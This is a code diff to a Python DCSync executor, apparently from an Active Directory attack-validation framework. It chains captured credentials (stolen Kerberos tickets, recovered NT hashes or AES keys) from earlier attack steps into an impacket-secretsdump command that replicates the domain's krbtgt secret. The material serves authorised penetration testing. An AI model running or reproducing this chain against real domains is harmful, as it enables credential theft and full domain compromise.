@@ -96,15 +96,44 @@ class DCSyncExecutor(ValidationExecutor):
         ]
 
     # ---------------------------------------------------------------- auth argv
-    def _secretsdump_argv(self, cfg, dc_host: str) -> list[str]:
-        """Build the secretsdump DCSync argv from the DA-equivalent ctx context.
+    def _secretsdump_argv(self, cfg, dc_host: str,
+                          input_caps: dict | None = None) -> list[str]:
+        """Build the secretsdump DCSync argv.
 
-        Credential mode follows ``ctx.config``: NT hash (``-hashes``), AES key /
-        ticket (``-k``), password (``domain/user:pass`` target), else ``-k
-        -no-pass`` (a ticket-backed context, e.g. a front's captured TGT). Secrets
-        ride ``-hashes`` / the ``:pass`` target so :func:`redact_argv` masks them.
+        **Composed (review B1):** a THREADED credential from an upstream front
+        takes precedence over ``cfg`` -- this is what makes ``a1+b1`` real.
+        ``input_caps`` (populated by the engine on this edge's context) may carry:
+          * ``ccache``   -- a captured TGT. The engine also sets ``KRB5CCNAME`` in
+            ``ctx.env``; here we authenticate with ``-k -no-pass`` AS the front's
+            ``principal`` (e.g. ``dc01$``), NOT the operator user -- without this
+            the DCSync would ignore the ccache and auth as the wrong identity.
+          * ``nt_hash`` / ``aes_key`` -- a recovered key for ``principal``
+            (shadow-creds / relay). Rides ``-hashes`` / ``-aesKey`` so
+            :func:`redact_argv` masks it; the engine keeps it in-memory only.
+
+        **Standalone:** credential mode follows ``cfg`` exactly as before (NT hash,
+        AES key, password, else ``-k -no-pass``). Secrets ride ``-hashes`` / the
+        ``:pass`` target so :func:`redact_argv` masks them.
         """
+        caps = input_caps or {}
         argv = ["impacket-secretsdump", "-just-dc-user", "krbtgt", "-dc-ip", cfg.dc_ip]
+        threaded_principal = caps.get("principal")
+        if caps.get("ccache"):               # composed: auth as the front's principal via KRB5CCNAME
+            user = threaded_principal or cfg.username or ""
+            argv += ["-k", "-no-pass"]
+            argv.append(f"{cfg.domain}/{user}@{dc_host}")
+            return argv
+        if caps.get("nt_hash"):              # composed: recovered NT hash for a principal
+            user = threaded_principal or cfg.username or ""
+            argv += ["-hashes", caps["nt_hash"]]
+            argv.append(f"{cfg.domain}/{user}@{dc_host}")
+            return argv
+        if caps.get("aes_key"):              # composed: recovered AES key for a principal
+            user = threaded_principal or cfg.username or ""
+            argv += ["-aesKey", caps["aes_key"], "-k"]
+            argv.append(f"{cfg.domain}/{user}@{dc_host}")
+            return argv
+        # standalone: operator-supplied credential mode (unchanged).
         user = cfg.username or ""
         if cfg.nt_hash:
             argv += ["-hashes", cfg.nt_hash]
@@ -150,8 +179,12 @@ class DCSyncExecutor(ValidationExecutor):
             gate["op"] = "dcsync"
 
         # DCSync: presence-only -- test whether the krbtgt replicated, never store it.
-        dcsync_argv = self._secretsdump_argv(cfg, dc_host)
-        res = ctx.runner.run(dcsync_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
+        # Composed: thread the front's credential (input_caps) + its KRB5CCNAME
+        # (ctx.env) so this DCSync authenticates with what the front produced (B1).
+        dcsync_argv = self._secretsdump_argv(cfg, dc_host, ctx.input_caps)
+        run_env = dict(ctx.env) if ctx.env else None
+        res = ctx.runner.run(dcsync_argv, env=run_env,
+                             timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         dcsync_ok = bool(_RE_DCSYNC_KRBTGT.search((res.stdout or "") + (res.stderr or "")))
         record("dcsync", dcsync_argv, res, dcsync_ok,
                note="krbtgt replicated" if dcsync_ok else "no replication data")
